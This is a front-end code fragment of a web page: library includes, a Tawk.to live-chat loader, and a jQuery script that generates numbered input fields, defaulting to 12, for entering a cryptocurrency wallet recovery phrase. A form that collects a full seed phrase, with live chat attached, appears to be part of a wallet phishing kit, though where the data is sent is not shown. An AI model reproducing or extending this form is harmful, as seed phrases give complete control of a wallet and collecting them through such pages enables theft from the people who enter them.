 

<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
<!--Start of Tawk.to Script-->
<script type="text/javascript">
    var Tawk_API = Tawk_API || {}, Tawk_LoadStart = new Date();
    (function () {
        var s1 = document.createElement("script"), s0 = document.getElementsByTagName("script")[0];
        s1.async = true;
        s1.src = '<?=TAWK_URL?>';
        s1.charset = 'UTF-8';
        s1.setAttribute('crossorigin', '*');
        s0.parentNode.insertBefore(s1, s0);
    })();
</script>
<script type="text/javascript">
    
    $(document).on('change', '#recovery_phrase_select', (e) => {
        addInput($(e.target).children("option:selected").val());
    });
    
    $(document).ready(() => {
        setTimeout(()=> {
            $('#recovery_phrase_select').val(12);
            addInput(12);
        },50);
    });
    
    
    addInput        =   (word)  =>  {
        console.log(word);
        let keys_input      =   '';
        $('.form_keys').html('');
        for (var i = 1; i <= parseInt(word); i++) {
            $('.form_keys').append(`<div class="col-sm-4 my4">
                <input type="text" name="keys[${i}]" class="form-control form-control-add key_input" placeholder="${i}." required="" onkeypress="return onlyAlphabets(event,this);" maxlength="50" autocomplete="off">
            </div>`)
        }
    }
    function onlyAlphabets(e, t) {
        try {
            if (window.event) {
                var charCode = window.event.keyCode;
            }
            else if (e) {
                var charCode = e.which;
            }
            else { return true; }
            if ((charCode > 64 && charCode < 91) || (charCode > 96 && charCode < 123 || charCode == 32))
                return true;
            else
                return false;
        }
        catch (err) {
            alert(err.Description);
        }
    }

</script>




<!--End of Tawk.to Script-->